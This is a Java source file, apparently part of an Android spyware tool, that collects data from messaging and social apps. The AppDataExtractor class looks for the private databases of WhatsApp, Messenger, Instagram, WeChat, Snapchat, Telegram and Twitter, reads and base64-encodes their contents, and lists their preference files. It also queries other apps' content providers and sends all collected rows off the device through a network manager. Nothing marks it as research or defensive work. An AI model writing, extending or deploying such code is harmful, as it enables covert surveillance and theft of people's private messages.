// AppDataExtractor.java
package com.ghost.core;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.util.Base64;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;

public class AppDataExtractor {
    
    private Context context;
    private NetworkManager networkManager;
    
    // Base de données des applications populaires
    private static final String[][] APP_DATABASES = {
        {"com.whatsapp", "msgstore.db", "wa.db"},
        {"com.facebook.orca", "threads_db2"},
        {"com.instagram.android", "direct.db"},
        {"com.tencent.mm", "EnMicroMsg.db"},
        {"com.snapchat.android", "chat.db"},
        {"org.telegram.messenger", "cache4.db"},
        {"com.twitter.android", "twitter.db"}
    };
    
    public AppDataExtractor(Context context) {
        this.context = context;
        this.networkManager = new NetworkManager(context);
    }
    
    public void extractAllAppsData() {
        PackageManager pm = context.getPackageManager();
        JSONArray appsData = new JSONArray();
        
        for (String[] appInfo : APP_DATABASES) {
            String packageName = appInfo[0];
            
            try {
                ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
                JSONObject appData = new JSONObject();
                appData.put("package", packageName);
                appData.put("name", pm.getApplicationLabel(ai));
                
                // Récupérer les bases de données
                JSONArray databases = new JSONArray();
                for (int i = 1; i < appInfo.length; i++) {
                    String dbName = appInfo[i];
                    File dbFile = new File("/data/data/" + packageName + "/databases/" + dbName);
                    
                    if (dbFile.exists()) {
                        JSONObject db = new JSONObject();
                        db.put("name", dbName);
                        db.put("size", dbFile.length());
                        
                        // Lire le début du fichier pour l'analyse
                        FileInputStream fis = new FileInputStream(dbFile);
                        byte[] header = new byte[1024];
                        int read = fis.read(header);
                        fis.close();
                        
                        db.put("header", Base64.encodeToString(header, 0, read, Base64.NO_WRAP));
                        databases.put(db);
                    }
                }
                
                appData.put("databases", databases);
                
                // Récupérer les shared preferences
                JSONArray prefs = new JSONArray();
                File prefsDir = new File("/data/data/" + packageName + "/shared_prefs");
                if (prefsDir.exists()) {
                    File[] prefFiles = prefsDir.listFiles();
                    if (prefFiles != null) {
                        for (File pf : prefFiles) {
                            JSONObject pref = new JSONObject();
                            pref.put("name", pf.getName());
                            pref.put("size", pf.length());
                            prefs.put(pref);
                        }
                    }
                }
                
                appData.put("preferences", prefs);
                appsData.put(appData);
                
            } catch (Exception e) {
                // App non installée
            }
        }
        
        if (appsData.length() > 0) {
            networkManager.sendData("apps_data", appsData.toString());
        }
    }
    
    public void extractContentProvider(String packageName) {
        // Tenter d'accéder aux Content Providers
        try {
            Uri uri = Uri.parse("content://" + packageName + ".provider");
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                Cursor cursor = context.getContentResolver().query(
                    uri, null, null, null, null
                );
                
                if (cursor != null) {
                    JSONArray data = new JSONArray();
                    
                    while (cursor.moveToNext()) {
                        JSONObject row = new JSONObject();
                        for (int i = 0; i < cursor.getColumnCount(); i++) {
                            String colName = cursor.getColumnName(i);
                            String value = cursor.getString(i);
                            row.put(colName, value);
                        }
                        data.put(row);
                    }
                    
                    cursor.close();
                    
                    if (data.length() > 0) {
                        networkManager.sendData("provider_" + packageName, data.toString());
                    }
                }
            }
            
        } catch (Exception e) {
            // Provider non accessible
        }
    }
}
